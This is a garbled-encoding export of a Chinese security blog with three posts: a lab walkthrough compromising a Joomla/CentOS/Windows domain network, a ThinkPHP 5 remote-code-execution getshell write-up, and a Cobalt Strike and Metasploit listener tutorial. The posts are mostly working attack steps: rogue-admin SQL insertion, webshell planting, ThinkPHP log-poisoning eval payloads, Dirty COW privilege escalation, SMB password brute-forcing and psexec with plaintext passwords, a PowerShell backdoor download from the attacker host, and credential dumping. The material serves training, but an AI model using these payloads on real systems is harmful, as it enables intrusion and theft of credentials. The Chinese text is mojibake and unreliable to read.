/>\n\n\n\nè¿æ¥æ•°æ®åº“\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207231612220.png)\n\n\n\næ‹¿åˆ°å¯†ç å¯†æ–‡ï¼Œè§£ä¸å‡ºæ¥\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207231622756.png)\n\n\n\næŸ¥é˜…å®˜æ–¹æ–‡æ¡£å‘ç°å¯ä»¥æ·»åŠ ä¸€ä¸ªç®¡ç†å‘˜è´¦å· https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn\n\n```mysql\nINSERT INTO am2zu_users (name, username, password, params, registerDate, lastvisitDate, lastResetTime) VALUES ('Administrator2', 'admin123', '433903e0a9d6a712e00251e44d29bf87:UJ0b9J5fufL3FKfCc0TLsYJBh2PFULvT', '', NOW(), NOW(), NOW()); INSERT INTO am2zu_user_usergroup_map (user_id,group_id) VALUES (LAST_INSERT_ID(),'8');\n```\n\n\n\næ‰§è¡Œsqlè¯­å¥æ·»åŠ è´¦å·å¯†ç admin123/admin\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207231623633.png)\n\n\n\nç™»å½•åå°åæ·»åŠ .phpåç¼€ç™½åå•\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207231627384.png)\n\n\n\nåœ¨åœ¨Extensions -> Templates -> Templateså¯ä»¥ç¼–è¾‘æ¨¡æ¿æ–‡ä»¶\n\nåˆ›å»ºä¸€ä¸ªæ–°çš„phpæ–‡ä»¶ç”¨æ¥å†™é©¬\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207231633717.png)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207231635473.png)\n\n\n\nä½¿ç”¨èšå‰‘è¿æ¥éœ€è¦æ³¨æ„å…³é—­èšå‰‘çš„ä»£ç†\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207231709238.png)\n\n\n\næ— æ³•æ‰§è¡Œå‘½ä»¤\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207231715213.png)\n\n\n\nå‘ç°disbale_funcionsç¦ç”¨äº†å‡½æ•°\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207231716993.png)\n\né€šè¿‡èšå‰‘æ’ä»¶å»ç»•è¿‡\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207231717581.png)\n\n\n\næŸ¥çœ‹ipï¼Œå‘ç°ä¸å¯¹åŠ²ï¼Œæˆ‘ä»¬è®¿é—®çš„ipæ˜æ˜æ˜¯192.168.31.54ï¼Œæ€ä¹ˆè¿™é‡Œæ˜¯192.168.93.120ï¼Œåº”è¯¥æ˜¯ä½¿ç”¨äº†nginxåå‘ä»£ç†\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207231722236.png)\n\n\n\nä¸Šçº¿åˆ°msfä¸Šåšä¸€ä¸ªå†…ç½‘æ‰«æï¼Œä½¿ç”¨ä¼ ç»Ÿçš„ç”Ÿäº§åé—¨å†ä¸Šä¼ å¤ªéº»çƒ¦äº†ï¼Œè¿™é‡Œä½¿ç”¨msfæœ¬åœ°èµ·ä¸€ä¸ªåé—¨\n\n```bash\nuse exploit/multi/script/web_delivery\n```\n\nè®¾ç½®ç›®æ ‡ä¸ºlinux\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207231735159.png)\n\nç„¶åå°†ç”Ÿæˆçš„å‘½ä»¤å¤åˆ¶åˆ°shellä¸­æ‰§è¡Œ\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207231737750.png)\n\nä½†æ˜¯æ²¡åå¼¹æˆåŠŸï¼Œä¸€å¼€å§‹æˆ‘è§‰å¾—æ˜¯æ²¡æœ‰æ‰§è¡Œæƒé™ï¼Œäºæ˜¯åˆ°/tmpç›®å½•ä¸‹å»æ‰§è¡Œï¼Œè¿˜æ˜¯æ²¡æœ‰åå¼¹æˆåŠŸï¼Œåº”è¯¥è·Ÿåå‘ä»£ç†æœ‰å…³ã€‚æˆ‘ä»¬è®¿é—®çš„æµé‡æ˜¯ä»centosè½¬å‘ç»™ubuntuï¼Œè€Œä¸”æˆ‘ä»¬ä¸èƒ½ç›´æ¥è®¿é—®ubuntuï¼Œä¸åœ¨ä¸€ä¸ªç½‘æ®µï¼Œæˆ‘ä»¬çš„æµé‡æ˜¯é€šè¿‡centosè½¬å‘çš„ï¼Œæ‹¿åˆ°çš„shellæ˜¯ubuntuçš„\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207232329857.png)\n\nä½†æ˜¯æ‰§è¡Œåå¼¹msfçš„æ—¶å€™å»é€šè¿‡å»ä¸‹è½½kaliä¸Šçš„åé—¨æ‰§è¡Œï¼Œè€Œubuntuå’Œkaliä¸åœ¨ä¸€ä¸ªç½‘æ®µæ‰€ä»¥æ²¡æ³•è®¿é—®ï¼Œå¦‚æœæ˜¯å¤–ç½‘ï¼Œkaliå’Œubuntuéƒ½åœ¨å¤–ç½‘ä¸”ubuntuå‡ºç½‘çš„è¯æ˜¯å¯ä»¥åå¼¹çš„ï¼Œä½†æ˜¯è¿™é‡Œæ˜¯å†…ç½‘è‡ªå·±æ­å»ºçš„ç¯å¢ƒ\n\n\n\næ‰€ä»¥è¿™å°ubuntuçš„æœºå™¨ï¼Œæä¸ææƒå·²ç»æ— æ‰€è°“äº†ï¼Œæ ¹æ®æˆ‘ä»¬æ‹¿åˆ°çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬è¦æ‹¿åˆ°centosçš„shellæ‰èƒ½ç»§ç»­ä¸‹ä¸€æ­¥ã€‚\n\nç»§ç»­å¾€ä¸‹,ä¹Ÿæ²¡æœ‰æ‰¾åˆ°å…³é”®ä¿¡æ¯ï¼Œæ‰¾äº†ä¸€ä¸‹å…¶ä»–å¸ˆå‚…çš„æ–‡ç« ï¼Œè¯´æ˜¯å­˜åœ¨/tmp/mysql/test.txtï¼Œä½†æˆ‘è¿™é‡Œå´æ²¡æœ‰ï¼Œæˆ‘ä¸Šé¶æœºçœ‹ç¡®å®ä¹Ÿæ²¡æœ‰ï¼Œä¸å¤ªæ‡‚ä¸ºä»€ä¹ˆ,å€Ÿç”¨ä¸€å¼ å…¶ä»–å¸ˆå‚…çš„å›¾\n\nwwwuser/wwwuser_123Aqx\n\n![img](https://xzfile.aliyuncs.com/media/upload/picture/20191223210200-68a25aaa-2584-1.png)\n\n\n\nsshè¿æ¥centosçš„æ—¶å€™æŠ¥é”™\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207232347136.png)\n\n\n\nä¹‹æ‰€ä»¥æŠ¥é”™æ˜¯å› ä¸ºOpenSSH 7.0ä»¥åçš„ç‰ˆæœ¬ä¸å†æ”¯æŒssh-dss (DSA)ç®—æ³•ï¼Œè§£å†³æ–¹æ³•æ˜¯å¢åŠ é€‰é¡¹-oHostKeyAlgorithms=+ssh-dss,å³å¯æˆåŠŸè§£å†³\n\n```bash\nssh -oHostKeyAlgorithms=+ssh-dss  wwwuser@192.168.31.54\n```\n\næˆåŠŸè¿æ¥\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207232348457.png)\n\n\n\nä½¿ç”¨ä¸Šé¢åå¼¹msfçš„æ–¹æ³•ï¼Œå°†shellä¸Šçº¿åˆ°msf\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207232354309.png)\n\n\n\nåœ¨tmpç›®å½•ä¸‹æ‰§è¡Œ\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207232357963.png)\n\n\n\nmsfæ”¶åˆ°ä¼šè¯\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207232358817.png)\n\n\n\n## ææƒ\n\nlinux ææƒä¸‰æ¿æ–§ å†…æ ¸ã€sudo -lã€rootæƒé™å‘½ä»¤\n\nå°è¯•äº†sudo -lå’Œrootæƒé™éƒ½æ— æœï¼Œmsfä¹Ÿæä¸åŠ¨ï¼ŒæŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬ç¬¦åˆè„ç‰›ï¼Œå°è¯•å†…æ ¸ææƒ\n\næŠŠææƒæ–‡ä»¶ä¼ ä¸Šå»ç¼–è¯‘\n\n```bash\ngcc -pthread dirty.c -o dirty -lcrypt\n```\n\n\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207240015422.png)\n\nåˆ‡æ¢ç”¨æˆ·\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207240017481.png)\n\nåœ¨ä½¿ç”¨æ­¤ç”¨æˆ·è¿è¡Œåˆšåˆšä¸Šçº¿msfçš„payloadï¼Œæˆ–è€…ç›´æ¥è¿è¡Œtmpç›®å½•ä¸‹çš„åé—¨ï¼Œè·å¾—ä¸€ä¸ªrootæƒé™çš„ä¼šè¯\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207240020674.png)\n\n\n\n# å†…ç½‘æ¸—é€\n\n## ä»£ç†\n\næŸ¥çœ‹ipå‘ç°æœ‰ä¸¤ä¸ªç½‘æ®µ\n\n<img src=\"https://raw.githubusercontent.com/chencicici/images/main/202207240021466.png\" style=\"zoom:50%;\" />\n\n\n\næ·»åŠ è·¯ç”±ï¼Œå°†msfä»£ç†è¿›å†…ç½‘ï¼Œå†èµ·ä¸€ä¸ªåå‘ä»£ç†æ–¹ä¾¿ä½¿ç”¨åˆ«çš„å·¥å…·\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207240026805.png)\n\n\n\nproxychainsæ·»åŠ ä¸€ä¸ªä»£ç†\n\n```bash\nvim /etc/proxychains4.conf\n```\n\n![image-20220724002827926](/Users/chenci/Library/Application Support/typora-user-images/image-20220724002827926.png)\n\nç”¨nmapæ‰«æå­˜æ´»ä¸»æœºå’Œç«¯å£ï¼Œè¦æ³¨æ„çš„æ˜¯prxychainsä»£ç†ä¸äº†icmpæµé‡ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨pingï¼Œåªèƒ½ç”¨tcpå»æ‰«æ\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207240046322.png)\n\n\n\nä¹Ÿå¯ä»¥ç”¨msfè‡ªå¸¦çš„æ¨¡å—å»æ‰«æ\n\n```bash\n# æ‰«æå­˜æ´»ä¸»æœº\nuse auxiliary/scanner/discovery/udp_probe\n```\n\næ‰«å‡ºä¸‰å°å­˜æ´»ä¸»æœº\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207240045848.png)\n\n\n\n```bash\næ‰«æç«¯å£\nuse auxiliary/scanner/discovery/udp_probe\n```\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207240048629.png)\n\n\n\nnmapæ‰«æçš„ç²¾ç¡®ä¸€ç‚¹\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207240104316.png)\n\n\n\nä¸‰å°ä¸»æœºéƒ½ä¸ºwindowsï¼Œ10å¼€å¯äº†53ç«¯å£ï¼Œæ¨æµ‹ä¸ºåŸŸæ§ï¼Œ20å¼€å¯äº†1433 mssqlï¼Œ30å’Œå…¶ä½™ä¸¤å°éƒ½å­˜åœ¨smbæœåŠ¡ï¼Œå°è¯•æ°¸æ’ä¹‹è“éƒ½ä¸å­˜åœ¨\n\næ¢ä¸ªæ–¹æ³•ï¼Œå°è¯•çˆ†ç ´smbç”¨æˆ·ï¼Œå°†ä¸Šé¢è·å–åˆ°çš„ä¸¤ä¸ªå¯†ç æ”¾å…¥å¯†ç æ–‡ä»¶è¿›è¡Œçˆ†ç ´\n\n<img src=\"https://raw.githubusercontent.com/chencicici/images/main/202207240116897.png\" style=\"zoom:50%;\" />\n\næœ€åçˆ†ç ´å‡º30ã€20çš„å¯†ç \n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207240119461.png)\n\n\n\nä½¿ç”¨msfè‡ªå¸¦æ¨¡å—æ¥æ”»å‡»,è¦æ³¨æ„çš„æ˜¯è¿™é‡Œä½¿ç”¨æ­£å‘è¿æ¥payloadï¼Œå› ä¸ºæˆ‘ä»¬ä½¿ç”¨åŠ äº†ä»£ç†\n\n```bash\nuse exploit/windows/smb/psexec\nset payload windows/x64/meterpreter/bind_tcp\nset SMBUser administrator\nset SMBPass 123qwe!ASD\nset RHOSTS 192.168.93.30\nexploit\n```\n\nå¾—åˆ°ä¸€ä¸ªsystemæƒé™çš„ä¼šè¯\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207240131876.png)\n\n\n\né€šè¿‡winexeå¾—åˆ°20çš„ä¼šè¯\n\n```bash\nproxychains winexe -U 'administrator%123qwe!ASD' //192.168.93.20 cmd.exe\n```\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207240200277.png)\n\n\n\nä»–ä¸Šçº¿åˆ°msfï¼Œç”Ÿæˆä¸€ä¸ªshellï¼Œå› ä¸ºç›®æ ‡ä¸»æœºä¸å‡ºç½‘ï¼Œæ‰€ä»¥æŠŠshellä¸Šä¼ åˆ°centosä¸»æœºä¸Š,å†ç”±centosä¸»æœºç”¨pythonèµ·ä¸€ä¸ªwebæœåŠ¡ï¼Œ20ä¸»æœºä½¿ç”¨powershellå»ä¸‹è½½\n\n<img src=\"https://raw.githubusercontent.com/chencicici/images/main/202207240245860.png\" style=\"zoom:50%;\" />\n\næ³¨æ„ä¸è¦å’ŒwebæœåŠ¡ç«¯å£èµ·å†²çªï¼Œä½¿ç”¨8899ç«¯å£\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207240245938.png)\n\nå¼€å¯è¿œç¨‹æ¡Œé¢\n\n```bash\n#è®¾ç½®è¿œç¨‹æ¡Œé¢ç«¯å£\nreg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /t REG_DWORD /v portnumber /d 3389 /f\n#å¼€å¯è¿œç¨‹æ¡Œé¢\nwmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1\n#æ£€æŸ¥ç«¯å£çŠ¶æ€\nnetstat -an|find \"3389\"\n```\n\nä½¿ç”¨administratorç™»å½•\n\n```bash\npowershell (new-object Net.WebClient).DownloadFile('http://192.168.93.128:8899/shell1.exe','C:\\shell.exe')\n```\n\n\n\nä¸‹è½½åé—¨\n\n<img src=\"https://raw.githubusercontent.com/chencicici/images/main/202207240242645.png\" style=\"zoom:50%;\" />\n\n\n\nkalièµ·ä¸€ä¸ªç›‘å¬ï¼Œæ³¨æ„è¿™é‡Œè¦ä½¿ç”¨æ­£å‘ç›‘å¬ï¼Œå› ä¸ºç›®æ ‡ä¸»æœºæ˜¯ä¸å‡ºç½‘çš„ï¼Œè¿è¡Œåé—¨æˆåŠŸåå¼¹ä¼šè¯\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207240248971.png)\n\n\n\nè¿ç§»è¿›ç¨‹åˆ°ä¸€ä¸ªç³»ç»Ÿè¿›ç¨‹åï¼Œä½¿ç”¨kiwiæŠ“å–å¯†ç ï¼ŒæŠ“åˆ°åŸŸæ§å¯†ç \n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207240253602.png)\n\n\n\nä½¿ç”¨åŒæ ·çš„æ–¹æ³•æ‹¿åˆ°cmd\n\n```bash\nproxychains winexe -U 'administrator%zxcASDqw123!!' //192.168.93.10 cmd.exe\n```\n\n\n\nä¸€æ ·çš„æ–¹æ³•ä¸Šçº¿msfï¼Œåªéœ€è¦ä¿®æ”¹æ­£å‘ç›‘å¬çš„ipå³å¯\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207240308139.png)\n","tags":["ATT&CK","å†…ç½‘æ¸—é€"],"categories":["æ‰“é¶"]},{"title":"tp5+php7.3 getshell","url":"/2022/07/21/tp5-php7-3-getshell/","content":"# å‰è¨€\nä»¥ä¸‹ä¸ºæœ¬åœ°ç¯å¢ƒæ­å»º\n\n# ä¿¡æ¯æ”¶é›†\næŠ¥é”™æ‹¿åˆ°cmsä¿¡æ¯,windows+iis+tp5\n![](https://raw.githubusercontent.com/chencicici/images/main/202207211912912.png)\n\n# webæ‰“ç‚¹\nthinkphp RCEæ¼æ´è¿˜æ˜¯æŒºå¤šçš„,ç›´æ¥ä¸Štpæ£€æµ‹ç¥å™¨\n![](https://raw.githubusercontent.com/chencicici/images/main/202207211914600.png)\n\nèƒ½æ‰§è¡Œphpinfoç¡®å®å­˜åœ¨RCE,æ‹¿åˆ°çœŸå®è·¯å¾„,å¾—åˆ°phpä¸º7.3\n![](https://raw.githubusercontent.com/chencicici/images/main/202207211915864.png)\n\nç›´æ¥ä½¿ç”¨å·¥å…·å†™shellå¤±è´¥\n\nexpå†™shellå¤±è´¥,php7.1ä»¥ä¸Šæ— æ³•ä½¿ç”¨assert\n```php\ns=file_put_contents('test.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert\n```\n\n# getshell\ngoogleäº†ä¸€ä¸‹,æ‰¾åˆ°æ—¥å¿—å†™shellæ–¹æ³•\n\nå°†shellå†™å…¥æ—¥å¿—\n```php\n/index.php?s=captcha\n_method=__construct&method=get&filter[]=call_user_func&server[]=-1&get[]=<?php eval($_POST['shell']); ?>\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202207211922941.png)\n\nåŒ…å«æ—¥å¿—æ–‡ä»¶getshell,æˆåŠŸæ‰§è¡Œphpinfo\n```php\n_method=__construct&method=get&filter[]=think\\__include_file&server[]=-1&get[]=../runtime/log/202207/21.log&shell=phpinfo();\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202207211923675.png)\n\nä¸Šèšå‰‘\n![](https://raw.githubusercontent.com/chencicici/images/main/202207211926496.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202207211928165.png)\n","tags":["getshell","thinkphp"],"categories":["æ¸—é€å®æˆ˜"]},{"title":"Cobalt Strikeä½¿ç”¨å­¦ä¹ ","url":"/2022/07/20/Cobalt-Strikeä½¿ç”¨å­¦ä¹ /","content":"\n# åŸºæœ¬ä½¿ç”¨\n\nCobalt Strikeä½¿ç”¨C/Sæ¶æ„ï¼ŒCobalt Strikeçš„å®¢æˆ·ç«¯è¿æ¥åˆ°å›¢é˜ŸæœåŠ¡å™¨ï¼Œå›¢é˜ŸæœåŠ¡å™¨è¿æ¥åˆ°ç›®æ ‡ï¼Œä¹Ÿå°±æ˜¯è¯´Cobalt Strikeçš„å®¢æˆ·ç«¯ä¸ä¸ç›®æ ‡æœåŠ¡å™¨è¿›è¡Œäº¤äº’ã€‚\n\n## å¯åŠ¨æœåŠ¡ç«¯\n\næœåŠ¡ç«¯ä¸€èˆ¬è®¾åœ¨å…¬ç½‘ipçš„æœåŠ¡å™¨ä¸Š\n\n```bash\n# ./teamserver your_ip your_passowrd [config_file]\n./teamserver 192.168.31.118 123456\n```\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207212117798.png)\n\n\n\n## å¯åŠ¨å®¢æˆ·ç«¯\n\n```bash\n./cobaltstrike   \n```\n\nè¾“å…¥åˆšæ‰è®¾ç½®çš„ipå’Œå¯†ç \n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207212121225.png)\n\n\n\n## è¿æ¥å¤šä¸ªæœåŠ¡ç«¯\n\nç›´æ¥æ–°å»ºé…ç½®å³å¯\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207212123267.png)\n\n# ç›‘å¬å™¨\n\nç›‘å¬å™¨å°±æ˜¯ç­‰å¾…è¢«å…¥ä¾µç³»ç»Ÿè¿æ¥è‡ªå·±çš„ä¸€ä¸ªæœåŠ¡ã€‚è¦æ˜¯ä¸ºäº†æ¥å—payloadå›ä¼ çš„å„ç±»æ•°æ®ï¼Œç±»ä¼¼äºMSFä¸­handlerçš„ä½œç”¨ã€‚æ¯”å¦‚payloadåœ¨ç›®æ ‡æœºå™¨æ‰§è¡Œä»¥åï¼Œå°±ä¼šå›è¿åˆ°ç›‘å¬å™¨ç„¶åä¸‹è½½æ‰§è¡ŒçœŸæ­£çš„shellcodeä»£ç ã€‚\n\n## Beacon\n\n- Beaconæ˜¯CSçš„payloadï¼Œå’Œmsfä¸­çš„meterpreterä¸€æ ·\n- Beaconæœ‰ä¸¤ç§é€šä¿¡æ¨¡å¼ã€‚ä¸€ç§æ˜¯å¼‚æ­¥é€šä¿¡æ¨¡å¼ï¼Œè¿™ç§æ¨¡å¼é€šä¿¡æ•ˆç‡ç¼“æ…¢ï¼ŒBeaconå›è¿å›¢é˜ŸæœåŠ¡å™¨ã€ä¸‹è½½ä»»åŠ¡ã€ç„¶åä¼‘çœ ï¼›å¦ä¸€ç§æ˜¯äº¤äº’å¼é€šä¿¡æ¨¡å¼ï¼Œè¿™ç§æ¨¡å¼çš„é€šä¿¡æ˜¯å®æ—¶å‘ç”Ÿçš„ã€‚\n- é€šè¿‡HTTPã€HTTPSå’ŒDNSå‡ºå£ç½‘ç»œ\n- ä½¿ç”¨SMBåè®®çš„æ—¶å€™æ˜¯ç‚¹å¯¹ç‚¹é€šä¿¡\n\n## HTTPå’ŒHTTPS Beacon\n\n- HTTP å’Œ HTTPS Beacon HTTPå’ŒHTTPS Beaconä¹Ÿå¯ä»¥å«åšWeb Beaconã€‚é»˜è®¤è®¾ç½®æƒ…å†µä¸‹ï¼ŒHTTP å’Œ HTTPS Beacon é€šè¿‡ HTTP GET è¯·æ±‚æ¥ä¸‹è½½ä»»åŠ¡ã€‚è¿™äº› Beacon é€šè¿‡ HTTP POST è¯·æ±‚ä¼ å›æ•°æ®ã€‚\n\n```bash\n  windows/beacon_http/reverse_http\n  windows/beacon_https/reverse_https\n```\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207212132790.png)\n\n\n\næµ‹è¯•ä¸€ä¸‹httpç›‘å¬å™¨ï¼Œç”¨åˆšæ‰çš„ç›‘å¬å™¨ç”Ÿæˆä¸€ä¸ªé’“é±¼é“¾æ¥\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207212146999.png)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207212300319.png)\n\nå°†ç”Ÿæˆçš„payloadæ”¾å…¥windowsä¸­è¿è¡Œ\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207212307393.png)\n\næˆåŠŸä¸Šçº¿cs\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207212308113.png)\n\n\n\nHTTPSå’ŒHTTPä¸€æ ·ï¼Œä¸åŒçš„æ˜¯HTTPSéœ€è¦ä¸€ä¸ªSSLè¯ä¹¦å…·ä½“å¦‚ä½•é…ç½®å¯ä»¥å‚è€ƒï¼šhttps://www.cobaltstrike.com/help-malleable-c2#validssl\n\n## DNS Beacon\n\nDNS Beaconï¼Œé¡¾åæ€ä¹‰å°±æ˜¯ä½¿ç”¨DNSè¯·æ±‚å°†Beaconè¿”å›ã€‚è¿™äº› DNS è¯·æ±‚ç”¨äºè§£æç”±ä½ çš„ CS å›¢é˜ŸæœåŠ¡å™¨ä½œä¸ºæƒå¨ DNS æœåŠ¡å™¨çš„åŸŸåã€‚DNS å“åº”å‘Šè¯‰ Beacon ä¼‘çœ æˆ–æ˜¯è¿æ¥åˆ°å›¢é˜ŸæœåŠ¡å™¨æ¥ä¸‹è½½ä»»åŠ¡ã€‚DNS å“åº”ä¹Ÿå‘Šè¯‰ Beacon å¦‚ä½•ä»ä½ çš„å›¢é˜ŸæœåŠ¡å™¨ä¸‹è½½ä»»åŠ¡ã€‚\n\nå› ä¸ºæ²¡æœ‰å¤šä½™çš„åŸŸåï¼Œæ‰€ä»¥ä¸æ¼”ç¤º\n\n\n\n## SMB Beacon\n\nSMB Beacon ä½¿ç”¨å‘½åç®¡é“é€šè¿‡ä¸€ä¸ªçˆ¶ Beacon è¿›è¡Œé€šä¿¡ã€‚è¿™ç§å¯¹ç­‰é€šä¿¡å¯¹åŒä¸€å°ä¸»æœºä¸Šçš„ Beacon å’Œè·¨ç½‘ç»œçš„ Beacon éƒ½æœ‰æ•ˆã€‚Windows å°†å‘½åç®¡é“é€šä¿¡å°è£…åœ¨ SMB åè®®ä¸­ã€‚å› æ­¤å¾—å SMB Beaconã€‚æ­¤æµé‡å°è£…åœ¨SMBåè®®ä¸­ï¼Œæ‰€ä»¥SMB Beaconç›¸å¯¹éšè”½ï¼Œç»•é˜²ç«å¢™æ—¶å¯èƒ½å‘æŒ¥å¥‡æ•ˆ(ç³»ç»Ÿé˜²ç«å¢™é»˜è®¤æ˜¯å…è®¸445çš„ç«¯å£ä¸å¤–ç•Œé€šä¿¡çš„ï¼Œå…¶ä»–ç«¯å£å¯èƒ½ä¼šå¼¹çª—æé†’ï¼Œä¼šå¯¼è‡´è¿œç¨‹å‘½ä»¤è¡Œåå¼¹shellå¤±è´¥)ã€‚\n\nSMB Beaconç›‘å¬å™¨å¯¹â€œæå‡æƒé™â€å’Œâ€œæ¨ªå‘æ¸—é€â€ä¸­å¾ˆæœ‰ç”¨ã€‚\n\n![img](https://cdn.jsdelivr.net/gh/JOHN-FROD/PicGo/blog-img/20220212105842.png)\n\n\n\næ–°å»ºSMBç›‘å¬å™¨\n\n<img src=\"https://raw.githubusercontent.com/chencicici/images/main/202207221643881.png\" style=\"zoom:50%;\" />\n\næ´¾ç”Ÿä¼šè¯åˆ°SMBç›‘å¬å™¨\n\nå³é”®->æ–°å»ºä¼šè¯->é€‰æ‹©smbç›‘å¬å™¨ æˆ–è€…ä½¿ç”¨å‘½ä»¤\n\n```bash\nspawn SMB\n```\n\n\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207221645118.png)\n\n\n\nç­‰å¾…ä¸€ä¼šï¼Œå°±å¯ä»¥çœ‹åˆ°SMB Beaconï¼Œåœ¨externalå¯ä»¥çœ‹åˆ°âˆâˆå­—ç¬¦\n\næ­¤æ—¶SMB Beaconé€šè¿‡çˆ¶çº§çš„HTTP Beaconä¸CSæœåŠ¡å™¨è¿›è¡Œé€šä¿¡ï¼Œè€ŒSMB Beaconä¸HTTP Beaconé€šè¿‡SMBåè®®è¿›è¡Œé€šä¿¡ã€‚\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207221649191.png)\n\n\n\nå°†SMB Beaconæ’å…¥ç³»ç»Ÿè¿›ç¨‹\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207221652561.png)\n\n\n\næ³¨å…¥åˆ°systemæƒé™çš„ç³»ç»Ÿè¿›ç¨‹ï¼Œè¿”å›çš„ä¼šè¯åˆ™æ˜¯systemæƒé™ï¼Œç®¡ç†å™¨æƒé™å¸¦*ğŸ‘ŒğŸ»\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207221653011.png)\n\n\n\næ­¤æ—¶å¦‚æœæƒ³æ–­å¼€æŸä¸ªä¼šè¯çš„è¿æ¥ï¼Œå¯ä»¥ä½¿ç”¨unlinkå‘½ä»¤ï¼Œæ¯”å¦‚å¦‚æœæƒ³æ–­å¼€192.168.175.144ï¼Œå°±å¯ä»¥åœ¨Beaconä¸­è¾“å…¥`unlink 10.10.10.80`\n\nå¦‚æœæƒ³å†æ¬¡è¿ä¸Šï¼Œå°±ç›´æ¥è¾“å…¥`link `10.10.10.80ï¼Œæƒ³ä»å½“å‰ä¸»æœºè¿åˆ°å…¶ä»–ä¸»æœºä¹Ÿå¯ä»¥ä½¿ç”¨æ­¤å‘½ä»¤ã€‚\n\n\n\nåœ¨è¿›ç¨‹ä¸­æ³¨å…¥SMB Beaconåï¼Œä¾¿èƒ½çœ‹åˆ°processä¸ºvmtoolsed.exeçš„æ´¾ç”ŸSMB Beaconã€‚\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207221654922.png)\n\n\n\n## TCP Beacon\n\nTCP Beaconä¸SMB Beaconç±»ä¼¼ï¼ŒåŒºåˆ«åœ¨äºè¿™é‡Œä½¿ç”¨çš„æ˜¯TCPåè®®ä¸çˆ¶çº§Beaconè¿›è¡Œé€šä¿¡ï¼Œä½¿ç”¨è¿™ç§æ–¹å¼ä¸Šçº¿æ—¶æµé‡æ˜¯ä¸åŠ å¯†çš„ã€‚\n\n\n\næ–°å»ºTCP Beacon\n\n<img src=\"https://raw.githubusercontent.com/chencicici/images/main/202207221657163.png\" style=\"zoom:50%;\" />\n\nä½¿ç”¨æ–¹æ³•å’Œä¸Šé¢ä¸€è‡´\n\n\n\n## Foreign Beacon\n\nä½¿ç”¨Cobalt Strikeå¤–éƒ¨ç›‘å¬å™¨å¯ä»¥æ´¾ç”Ÿç»™msfçš„meterpreterä¼šè¯ï¼Œè¿™é‡Œæœ‰Foreign HTTPå’ŒForeign HTTPSä¸¤ç§ç›‘å¬å™¨ï¼Œå…¶ä¸­Foreign HTTPSçš„æµé‡æ˜¯åŠ å¯†çš„ã€‚\n\nmsfå…ˆèµ·ä¸€ä¸ªç›‘å¬ï¼Œmsfçš„payloadåªèƒ½ä½¿ç”¨httpæ–¹å¼ï¼Œå› ä¸ºcsçš„ç›‘å¬å™¨åªæ”¯æŒhttpå’Œhttps\n\n```bash\nuse exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_http\nset LHOST 192.168.31.118\nset LPORT 4444\nrun\n```\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207221712096.png)\n\n\n\nCSé…ç½®ä¸€ä¸ªForeign HTTPï¼Œè¦ä¸msfçš„ç«¯å£ã€ipã€payloadä¸€è‡´\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207221709422.png)\n\n\n\nspawn msf æ´¾ç”Ÿç»™msfï¼Œmsfä¼šæ”¶åˆ°ä¼šè¯\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207221923888.png)\n\nä¸çŸ¥é“ä¸ºä»€ä¹ˆæ²¡æœ‰å¤ç°æˆåŠŸ\n\n\n\n\n\nmsfæ´¾ç”Ÿä¼šè¯ç»™cs\n\nç”Ÿæˆç›‘å¬å™¨\n\n 